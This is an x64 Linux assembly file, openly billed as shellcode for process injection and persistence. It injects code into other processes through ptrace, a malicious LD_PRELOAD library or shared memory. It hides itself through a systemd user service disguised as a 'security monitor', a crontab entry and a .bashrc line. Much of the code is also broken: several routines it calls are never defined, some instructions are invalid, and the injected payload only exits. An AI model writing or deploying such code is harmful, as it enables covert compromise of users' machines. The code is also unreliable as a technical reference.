; Linux x64 Shellcode - Advanced Process Injection and Persistence
; Compatible with System V AMD64 ABI
; Includes multiple injection techniques and stealth features

BITS 64

section .text
global _start

; Main shellcode entry point
_start:
    ; Save registers and set up stack frame
    push rbp
    mov rbp, rsp
    sub rsp, 0x200              ; Allocate stack space for local variables
    
    ; Initialize and detect environment
    call detect_linux_environment
    mov [rbp-8], rax            ; Save environment flags
    
    ; Establish persistence first
    call establish_persistence
    
    ; Choose injection technique based on capabilities
    mov rax, [rbp-8]
    test rax, 1                 ; Check if we have ptrace capability
    jnz ptrace_injection
    
    test rax, 2                 ; Check if we have LD_PRELOAD capability
    jnz ld_preload_injection
    
    ; Fallback to shared memory injection
    jmp shm_injection

; Detect Linux environment and capabilities
detect_linux_environment:
    push rbp
    mov rbp, rsp
    sub rsp, 0x100
    
    xor rbx, rbx                ; Environment flags
    
    ; Check if running as root (UID 0)
    mov rax, 102                ; getuid system call
    syscall
    test rax, rax
    jnz check_ptrace
    or rbx, 4                   ; Set root flag
    
check_ptrace:
    ; Check if ptrace is available
    mov rax, 101                ; ptrace system call
    mov rdi, 0                  ; PTRACE_TRACEME
    mov rsi, 0
    mov rdx, 0
    mov r10, 0
    syscall
    cmp rax, -1
    je check_capabilities
    or rbx, 1                   ; Set ptrace flag
    
check_capabilities:
    ; Check for LD_PRELOAD capability
    call check_ld_preload
    test rax, rax
    jz check_proc_access
    or rbx, 2                   ; Set LD_PRELOAD flag
    
check_proc_access:
    ; Check /proc access
    lea rdi, [rbp-0x50]         ; Buffer for path
    mov rsi, proc_path
    call strcpy
    
    mov rax, 2                  ; open system call
    mov rdi, rbp-0x50          ; /proc path
    mov rsi, 0                  ; O_RDONLY
    syscall
    cmp rax, -1
    je detect_done
    
    ; Close file descriptor
    mov rdi, rax
    mov rax, 3                  ; close system call
    syscall
    
    or rbx, 8                   ; Set proc access flag
    
detect_done:
    mov rax, rbx
    add rsp, 0x100
    mov rsp, rbp
    pop rbp
    ret

; Establish persistence mechanisms
establish_persistence:
    push rbp
    mov rbp, rsp
    sub rsp, 0x100
    
    ; Try systemd user service
    call create_systemd_service
    test rax, rax
    jnz persistence_cron
    
persistence_cron:
    ; Try crontab entry
    call create_cron_job
    test rax, rax
    jnz persistence_bashrc
    
persistence_bashrc:
    ; Try .bashrc modification
    call modify_bashrc
    
persistence_done:
    add rsp, 0x100
    mov rsp, rbp
    pop rbp
    ret

; Create systemd user service for persistence
create_systemd_service:
    push rbp
    mov rbp, rsp
    sub rsp, 0x200
    
    ; Get home directory path
    call get_home_directory
    test rax, rax
    jz systemd_failed
    
    ; Build service file path
    lea rdi, [rbp-0x100]        ; Buffer
    mov rsi, rax                ; Home directory
    call strcpy
    
    lea rdi, [rbp-0x100]
    lea rsi, [systemd_user_path]
    call strcat
    
    ; Create directory structure
    lea rdi, [rbp-0x100]
    call create_directory_recursive
    
    ; Create service file
    lea rdi, [rbp-0x100]
    lea rsi, [service_filename]
    call strcat
    
    ; Open service file for writing
    mov rax, 2                  ; open
    lea rdi, [rbp-0x100]        ; service file path
    mov rsi, 0x241              ; O_WRONLY | O_CREAT | O_TRUNC
    mov rdx, 0o644              ; permissions
    syscall
    cmp rax, -1
    je systemd_failed
    
    ; Write service content
    mov rdi, rax                ; file descriptor
    lea rsi, [service_content]
    mov rdx, service_content_len
    mov rax, 1                  ; write
    syscall
    
    ; Close file
    mov rax, 3                  ; close
    syscall
    
    ; Enable and start service
    call systemctl_enable_user_service
    
    mov rax, 1                  ; Success
    jmp systemd_done
    
systemd_failed:
    xor rax, rax
    
systemd_done:
    add rsp, 0x200
    mov rsp, rbp
    pop rbp
    ret

; Create cron job for persistence
create_cron_job:
    push rbp
    mov rbp, rsp
    sub rsp, 0x100
    
    ; Fork process for crontab manipulation
    mov rax, 57                 ; fork
    syscall
    test rax, rax
    jz cron_child
    
    ; Parent process - wait for child
    mov rdi, rax                ; child PID
    lea rsi, [rbp-8]            ; status
    mov rdx, 0                  ; options
    mov rax, 61                 ; wait4
    syscall
    
    ; Check child exit status
    mov eax, [rbp-8]
    test eax, eax
    jz cron_success
    
    xor rax, rax
    jmp cron_done
    
cron_child:
    ; Execute crontab command
    lea rdi, [crontab_cmd]
    lea rsi, [crontab_argv]
    lea rdx, [environ]
    mov rax, 59                 ; execve
    syscall
    
    ; If execve fails, exit child
    mov rax, 60                 ; exit
    mov rdi, 1
    syscall
    
cron_success:
    mov rax, 1
    
cron_done:
    add rsp, 0x100
    mov rsp, rbp
    pop rbp
    ret

; Modify .bashrc for persistence
modify_bashrc:
    push rbp
    mov rbp, rsp
    sub rsp, 0x200
    
    ; Get home directory
    call get_home_directory
    test rax, rax
    jz bashrc_failed
    
    ; Build .bashrc path
    lea rdi, [rbp-0x100]
    mov rsi, rax
    call strcpy
    
    lea rdi, [rbp-0x100]
    lea rsi, [bashrc_suffix]
    call strcat
    
    ; Open .bashrc for appending
    mov rax, 2                  ; open
    lea rdi, [rbp-0x100]
    mov rsi, 0x401              ; O_WRONLY | O_APPEND
    syscall
    cmp rax, -1
    je bashrc_failed
    
    ; Append our entry
    mov rdi, rax
    lea rsi, [bashrc_entry]
    mov rdx, bashrc_entry_len
    mov rax, 1                  ; write
    syscall
    
    ; Close file
    mov rax, 3                  ; close
    syscall
    
    mov rax, 1
    jmp bashrc_done
    
bashrc_failed:
    xor rax, rax
    
bashrc_done:
    add rsp, 0x200
    mov rsp, rbp
    pop rbp
    ret

; Ptrace-based injection
ptrace_injection:
    push rbp
    mov rbp, rsp
    sub rsp, 0x100
    
    ; Find target process
    call find_target_process
    test rax, rax
    jz ptrace_failed
    mov [rbp-8], rax            ; Save target PID
    
    ; Attach to process
    mov rax, 101                ; ptrace
    mov rdi, 16                 ; PTRACE_ATTACH
    mov rsi, [rbp-8]            ; target PID
    mov rdx, 0
    mov r10, 0
    syscall
    cmp rax, -1
    je ptrace_failed
    
    ; Wait for process to stop
    mov rax, 61                 ; wait4
    mov rdi, [rbp-8]
    lea rsi, [rbp-16]           ; status
    mov rdx, 0
    mov r10, 0
    syscall
    
    ; Inject shellcode using ptrace
    call inject_via_ptrace
    
    ; Detach from process
    mov rax, 101                ; ptrace
    mov rdi, 17                 ; PTRACE_DETACH
    mov rsi, [rbp-8]
    mov rdx, 0
    mov r10, 0
    syscall
    
    mov rax, 1
    jmp ptrace_done
    
ptrace_failed:
    xor rax, rax
    
ptrace_done:
    add rsp, 0x100
    mov rsp, rbp
    pop rbp
    ret

; Inject code via ptrace
inject_via_ptrace:
    push rbp
    mov rbp, rsp
    sub rsp, 0x100
    
    ; Get target process registers
    mov rax, 101                ; ptrace
    mov rdi, 12                 ; PTRACE_GETREGS
    mov rsi, [rbp-8]            ; target PID
    mov rdx, 0
    lea r10, [rbp-0x80]         ; register buffer
    syscall
    
    ; Allocate memory in target process using mmap
    mov rax, 101                ; ptrace
    mov rdi, 4                  ; PTRACE_POKETEXT
    mov rsi, [rbp-8]
    mov rdx, [rbp-0x80+8*16]    ; RIP from saved registers
    lea r10, [mmap_stub]        ; mmap shellcode stub
    syscall
    
    ; Execute mmap in target process
    mov rax, 101                ; ptrace
    mov rdi, 7                  ; PTRACE_CONT
    mov rsi, [rbp-8]
    mov rdx, 0
    mov r10, 0
    syscall
    
    ; Wait for mmap to complete
    mov rax, 61                 ; wait4
    mov rdi, [rbp-8]
    lea rsi, [rbp-16]
    mov rdx, 0
    mov r10, 0
    syscall
    
    ; Get allocated address from registers
    mov rax, 101                ; ptrace
    mov rdi, 12                 ; PTRACE_GETREGS
    mov rsi, [rbp-8]
    mov rdx, 0
    lea r10, [rbp-0x80]
    syscall
    
    ; Copy our payload to allocated memory
    call copy_payload_via_ptrace
    
    ; Jump to injected code
    mov rax, [rbp-0x80]         ; RAX contains allocated address
    mov [rbp-0x80+8*16], rax    ; Set RIP to injected code
    
    ; Restore modified registers
    mov rax, 101                ; ptrace
    mov rdi, 13                 ; PTRACE_SETREGS
    mov rsi, [rbp-8]
    mov rdx, 0
    lea r10, [rbp-0x80]
    syscall
    
    add rsp, 0x100
    mov rsp, rbp
    pop rbp
    ret

; LD_PRELOAD based injection
ld_preload_injection:
    push rbp
    mov rbp, rsp
    sub rsp, 0x200
    
    ; Create malicious shared library
    call create_malicious_so
    test rax, rax
    jz ld_preload_failed
    
    ; Set LD_PRELOAD environment variable
    lea rdi, [rbp-0x100]
    lea rsi, [ld_preload_env]
    call strcpy
    
    lea rdi, [rbp-0x100]
    mov rsi, rax                ; Path to malicious .so
    call strcat
    
    ; Execute target with LD_PRELOAD
    call execute_with_preload
    
    mov rax, 1
    jmp ld_preload_done
    
ld_preload_failed:
    xor rax, rax
    
ld_preload_done:
    add rsp, 0x200
    mov rsp, rbp
    pop rbp
    ret

; Shared memory injection
shm_injection:
    push rbp
    mov rbp, rsp
    sub rsp, 0x100
    
    ; Create shared memory segment
    mov rax, 29                 ; shmget
    mov rdi, 0x1337            ; key
    mov rsi, 0x1000            ; size
    mov rdx, 0x200 | 0x400     ; IPC_CREAT | 0o600
    syscall
    cmp rax, -1
    je shm_failed
    mov [rbp-8], rax           ; Save shm ID
    
    ; Attach shared memory
    mov rax, 30                ; shmat
    mov rdi, [rbp-8]
    mov rsi, 0
    mov rdx, 0
    syscall
    cmp rax, -1
    je shm_cleanup
    mov [rbp-16], rax          ; Save shm address
    
    ; Copy payload to shared memory
    mov rdi, rax
    lea rsi, [payload_code]
    mov rcx, payload_size
    rep movsb
    
    ; Find target process and inject reference to shm
    call inject_shm_reference
    
    mov rax, 1
    jmp shm_done
    
shm_cleanup:
    ; Remove shared memory segment
    mov rax, 31                ; shmctl
    mov rdi, [rbp-8]
    mov rsi, 0                 ; IPC_RMID
    mov rdx, 0
    syscall
    
shm_failed:
    xor rax, rax
    
shm_done:
    add rsp, 0x100
    mov rsp, rbp
    pop rbp
    ret

; Helper functions

; Find suitable target process
find_target_process:
    push rbp
    mov rbp, rsp
    sub rsp, 0x100
    
    ; Scan /proc for processes
    mov rax, 2                  ; open
    lea rdi, [proc_dir]
    mov rsi, 0x10000           ; O_RDONLY | O_DIRECTORY
    syscall
    cmp rax, -1
    je find_failed
    mov [rbp-8], rax           ; Save fd
    
    ; Read directory entries
find_loop:
    mov rax, 78                ; getdents
    mov rdi, [rbp-8]
    lea rsi, [rbp-0x80]        ; buffer
    mov rdx, 0x70              ; size
    syscall
    test rax, rax
    jz find_close
    
    ; Parse directory entries for numeric PIDs
    lea rbx, [rbp-0x80]
    add rbx, 19                ; Skip to name field
    
    ; Check if entry is numeric (PID)
    call is_numeric_string
    test rax, rax
    jz find_loop
    
    ; Convert to PID and validate
    call string_to_pid
    cmp rax, 1000              ; Skip system processes
    jl find_loop
    
    ; Check if process is suitable target
    call is_suitable_target
    test rax, rax
    jnz find_close             ; Found target
    
    jmp find_loop
    
find_close:
    push rax                   ; Save result
    mov rdi, [rbp-8]
    mov rax, 3                 ; close
    syscall
    pop rax
    jmp find_done
    
find_failed:
    xor rax, rax
    
find_done:
    add rsp, 0x100
    mov rsp, rbp
    pop rbp
    ret

; Get home directory from environment
get_home_directory:
    push rbp
    mov rbp, rsp
    
    ; Look for HOME environment variable
    lea rdi, [home_env_name]
    call getenv
    test rax, rax
    jnz home_done
    
    ; Fallback to /tmp
    lea rax, [tmp_fallback]
    
home_done:
    mov rsp, rbp
    pop rbp
    ret

; Simple string functions
strcpy:
    ; rdi = dest, rsi = src
    push rdi
strcpy_loop:
    mov al, [rsi]
    mov [rdi], al
    test al, al
    jz strcpy_done
    inc rsi
    inc rdi
    jmp strcpy_loop
strcpy_done:
    pop rax
    ret

strcat:
    ; rdi = dest, rsi = src
    push rdi
    ; Find end of dest
strcat_find_end:
    cmp byte [rdi], 0
    je strcat_copy
    inc rdi
    jmp strcat_find_end
strcat_copy:
    mov al, [rsi]
    mov [rdi], al
    test al, al
    jz strcat_done
    inc rsi
    inc rdi
    jmp strcat_copy
strcat_done:
    pop rax
    ret

; Exit shellcode
exit_shellcode:
    ; Clean up and exit
    add rsp, 0x200
    mov rsp, rbp
    pop rbp
    
    mov rax, 60                ; exit system call
    mov rdi, 0                 ; exit status
    syscall

; Data section
section .data

; File paths and strings
proc_path:              db '/proc/self/status', 0
proc_dir:               db '/proc', 0
systemd_user_path:      db '/.config/systemd/user/', 0
service_filename:       db 'security-monitor.service', 0
bashrc_suffix:          db '/.bashrc', 0
home_env_name:          db 'HOME', 0
tmp_fallback:           db '/tmp', 0
ld_preload_env:         db 'LD_PRELOAD=', 0

; Service file content
service_content:        db '[Unit]', 10
                        db 'Description=Security Monitor Service', 10
                        db 'After=graphical-session.target', 10, 10
                        db '[Service]', 10
                        db 'Type=simple', 10
                        db 'ExecStart=/usr/local/bin/security-monitor', 10
                        db 'Restart=always', 10, 10
                        db '[Install]', 10
                        db 'WantedBy=default.target', 10, 0
service_content_len:    equ $ - service_content

; Bashrc entry
bashrc_entry:           db 10, '# Security monitor', 10
                        db '/usr/local/bin/security-monitor >/dev/null 2>&1 &', 10, 0
bashrc_entry_len:       equ $ - bashrc_entry

; Crontab command and arguments
crontab_cmd:            db '/usr/bin/crontab', 0
crontab_argv:           dq crontab_cmd
                        dq crontab_arg1
                        dq 0
crontab_arg1:           db '-', 0

; Environment pointer (would be set at runtime)
environ:                dq 0

; Mmap stub for ptrace injection
mmap_stub:              ; Small stub to call mmap in target process
                        mov rax, 9      ; mmap
                        mov rdi, 0      ; addr
                        mov rsi, 0x1000 ; length  
                        mov rdx, 7      ; PROT_READ | PROT_WRITE | PROT_EXEC
                        mov r10, 0x22   ; MAP_PRIVATE | MAP_ANONYMOUS
                        mov r8, -1      ; fd
                        mov r9, 0       ; offset
                        syscall
                        int3            ; breakpoint for ptrace
mmap_stub_end:

; Payload code to inject
payload_code:
    ; Minimal payload - just a marker
    mov rax, 60            ; exit
    mov rdi, 42            ; distinctive exit code
    syscall
payload_code_end:
payload_size:           equ payload_code_end - payload_code